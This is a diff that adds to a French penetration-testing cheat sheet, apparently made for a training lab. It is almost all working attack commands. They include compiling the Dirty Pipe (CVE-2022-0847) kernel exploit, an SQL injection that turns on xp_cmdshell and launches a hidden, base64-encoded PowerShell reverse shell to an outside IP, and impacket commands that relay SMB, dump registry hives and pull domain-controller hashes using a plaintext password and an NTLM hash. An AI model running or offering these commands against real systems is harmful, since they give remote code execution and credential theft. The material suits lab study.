@@ -45,9 +45,39 @@ sudo apt install default-jdk -y
 Prendre le temps de bien lire les messages d'erreurs
 Bien lire le code en conséquence pour comprendre
 
+Compiler avec -static pur inclure les dépendances
+```bash
+gcc 50808.c -static -o CVE-2022-0847
+```
 ## Misc
 
 ```powershell
 cd C:\xampp\mysql\bin\
 .\mysqldump.exe -A -u root > output.txt
+```
+
+## SQLi
+
+```
+'; EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;--
+
+'; EXEC xp_cmdshell 'powershell -nop -noni -w hidden -ep bypass -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACcAMQA5ADIALgAxADYAOAAuADQANQAuADIANAA1ACcALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0A
+```
+
+## BackupOperator domaine
+
+```bash
+listener_add --addr 0.0.0.0:445 --to 127.0.0.1:445 --tcp
+```
+
+```bash
+impacket-smbserver -smb2support someshare ./
+```
+
+```bash
+impacket-reg medtech.com/joe:'Flowers1'@172.16.190.10 backup -o '\\<IP_PIVOT>\someshare\'
+```
+
+```bash
+impacket-secretsdump medtech.com/'DC01$'@172.16.190.10 -hashes aad3b435b51404eeaad3b435b51404ee:2e283e8ba256451651cacb72e8fac449
 ```
